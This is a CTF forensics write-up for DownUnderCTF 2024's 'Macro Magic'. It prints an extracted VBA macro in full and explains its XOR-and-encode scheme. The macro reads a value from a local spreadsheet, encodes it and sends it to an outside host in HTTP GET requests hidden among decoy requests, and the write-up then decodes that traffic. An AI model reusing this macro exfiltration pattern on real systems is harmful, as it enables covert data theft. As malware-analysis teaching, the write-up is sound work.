---
title: "Macro Magic"
description: "We managed to pull this excel spreadsheet artifact from one of our Outpost machines. Its got something sus happening under the hood. After opening we found and captured some suspicious traffic on our network. Can you find out what this traffic is and find the flag! Note: You do not need to run or enable the macro so solve."
pubDate: 2024-07-10
ctf: "DownUnderCTF 2024"
category: "forensics"
author: "sealldev"
section: "CTFs"
image: "images/24-downunder/icon.png"
---



We are given a `Monke.xlsm` and `Capture.pcapng`. The hint of 'Macro' guides me to look into any Macros in the `Monke.xlsm`. I utilise the oletools tool, `olevba` to extract the macro:
```bash
$ olevba Monke.xlsm      
olevba 0.60.2 on Python 3.12.4 - http://decalage.info/python/oletools
===============================================================================
FILE: Monke.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
...
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|MSXML2.ServerXMLHTTP|May download files from the Internet         |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |https://play.duc.tf/|URL                                          |
|IOC       |http://flag.com/    |URL                                          |
|IOC       |http://play.duc.tf/ |URL                                          |
|IOC       |http://en.wikipedia.|URL                                          |
|          |org/wiki/Emu_War    |                                             |
|IOC       |http://downunderctf.|URL                                          |
|          |com/                |                                             |
+----------+--------------------+---------------------------------------------+
```

Now I got the `Module1` macro but its full of useless comments, removing those we get this:
```vb
Public Function anotherThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    anotherThing = A
End Function
Public Function importantThing()
    Dim tempString As String
    Dim tempInteger As Integer
    Dim I As Integer
    Dim J As Integer
    For I = 1 To 5
        Cells(I, 2).Value = WorksheetFunction.RandBetween(0, 1000)
    Next I
    For I = 1 To 5
        For J = I + 1 To 5
            If Cells(J, 2).Value < Cells(I, 2).Value Then
                tempString = Cells(I, 1).Value
                Cells(I, 1).Value = Cells(J, 1).Value
                Cells(J, 1).Value = tempString
                tempInteger = Cells(I, 2).Value
                Cells(I, 2).Value = Cells(J, 2).Value
                Cells(J, 2).Value = tempInteger
            End If
        Next J
    Next I
End Function
Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function
Sub macro1()
    Dim Path As String
    Dim wb As Workbook
    Dim A As String
    Dim B As String
    Dim C As String
    Dim D As String
    Dim E As String
    Dim F As String
    Dim G As String
    Dim H As String
    Dim J As String
    Dim K As String
    Dim L As String
    Dim M As String
    Dim N As String
    Dim O As String
    Dim P As String
    Dim Q As String
    Dim R As String
    Dim S As String
    Dim T As String
    Dim U As String
    Dim V As String
    Dim W As String
    Dim X As String
    Dim Y As String
    Dim Z As String
    Dim I As Long
    N = importantThing()
    K = "Yes"
    S = "Mon"
    U = forensics(K)
    V = totalyFine(U)
    D = "Ma"
    J = "https://play.duc.tf/" + V
    superThing (J)
    J = "http://flag.com/"
    superThing (J)
    G = "key"
    J = "http://play.duc.tf/"
    superThing (J)
    J = "http://en.wikipedia.org/wiki/Emu_War"
    superThing (J)
    N = importantThing()
    Path = ThisWorkbook.Path & "\flag.xlsx"
    Set wb = Workbooks.Open(Path)
    Dim valueA1 As Variant
    valueA1 = wb.Sheets(1).Range("A1").Value
    MsgBox valueA1
    wb.Close SaveChanges:=False
    F = "gic"
    N = importantThing()
    Q = "Flag: " & valueA1
    H = "Try Harder"
    U = forensics(H)
    V = totalyFine(U)
    J = "http://downunderctf.com/" + V
    superThing (J)
    W = S + G + D + F
    O = doThing(Q, W)
    M = anotherThing(O, W)
    A = something(O)
    Z = forensics(O)
    N = importantThing()
    P = "Pterodactyl"
    U = forensics(P)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    T = totalyFine(Z)
    MsgBox T
    J = "http://downunderctf.com/" + T
    superThing (J)
    N = importantThing()
    E = "Forensics"
    U = forensics(E)
    V = totalyFine(U)
    J = "http://play.duc.tf/" + V
    superThing (J)
    
End Sub
Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function
Public Function superThing(ByVal A As String) As String
    With CreateObject("MSXML2.ServerXMLHTTP.6.0")
        .Open "GET", A, False
        .Send
        superThing = StrConv(.responseBody, vbUnicode)
    End With
End Function
Public Function something(B As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(inputText)
        A = A & WorksheetFunction.Dec2Bin(Asc(Mid(B, I, 1)))
    Next I
    something = A
End Function
Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function
```

We can see that `superThing()` sends a web request, so there are a few web requests in order.
- http://play.duc.tf/ + `totalyFine(forensics("Yes"))`
- http://flag.com/
- http://play.duc.tf/
- http://en.wikipedia.org/wiki/Emu_War
- http://downunderctf.com/ + `totalyFine(forensics("Try Harder"))`
- http://play.duc.tf/ + `totalyFine(forensics("Pterodactyl"))`
- http://downunderctf.com/ + `totalyFine(forensics(doThing("Flag: " & valueA1, "MonkeyMagic")))`
- http://play.duc.tf/ + `totalyFine(forensics("Forensics"))`

Let's figure out what `doThing` does.

```vb
Public Function doThing(B As String, C As String) As String
    Dim I As Long
    Dim A As String
    For I = 1 To Len(B)
        A = A & Chr(Asc(Mid(B, I, 1)) Xor Asc(Mid(C, (I - 1) Mod Len(C) + 1, 1)))
    Next I
    doThing = A
End Function
```

It takes in `B` and `C` as inputs, then defines `I` as a Long and `A` as a String. For the length of `B` we append the following to `A` each time:
- Get the ASCII character of index `I` in `B`.
- Get the ASCII character of index `(I-1) % Len(C) + 1` in `C`.
- XOR the fist ASCII character by the second.
- `Chr` converts the result back to a character.
- return `A`.

OK! Let's figure out `forensics()`.

```vb
Public Function forensics(B As String) As String
    Dim A() As Byte
    Dim I As Integer
    Dim C As String
    A = StrConv(B, vbFromUnicode)
    For I = LBound(A) To UBound(A)
        C = C & CStr(A(I)) & " "
    Next I
    C = Trim(C)
    forensics = C
End Function
```

It takes in `B` as input and defines an `A()`, `I` and `C`.
- set `A` to `B` converted from Unicode to systems default character set.
- iterate through `A` and append the string representation of each character of `A` to `C`, adds a space after each character also.
- removes any trailing of leading spaces from `C`.
- return `C`.

Finally, `totalyFine()`.

```vb
Public Function totalyFine(A As String) As String
    Dim B As String
    B = Replace(A, " ", "-")
    totalyFine = B
End Function
```

Replaces all spaces with `-`'s, thats it.

Now looking at the `Capture.pcapng` I take out the suspicious request which involves the flag: `11-3-15-12-95-89-9-52-36-61-37-54-34-90-15-86-38-26-80-19-1-60-12-38-49-9-28-38-0-81-9-2-80-52-28-19`.

I start working backwards from the output in Python.

```python
from itertools import cycle

def xor_strings(s1, s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(s1, cycle(s2)))

def decode_ascii(ascii_string):
    return ''.join(chr(int(code)) for code in ascii_string.split('-'))

W = "MonkeyMagic"
encoded_flag = "11-3-15-12-95-89-9-52-36-61-37-54-34-90-15-86-38-26-80-19-1-60-12-38-49-9-28-38-0-81-9-2-80-52-28-19"
decoded_ascii = decode_ascii(encoded_flag)
flag = xor_strings(decoded_ascii, W)

print("Decoded Flag:", flag)
```

This prints the flag: `Decoded Flag: Flag: DUCTF{M4d3_W1th_AI_by_M0nk3ys}`.

Flag: `DUCTF{M4d3_W1th_AI_by_M0nk3ys}`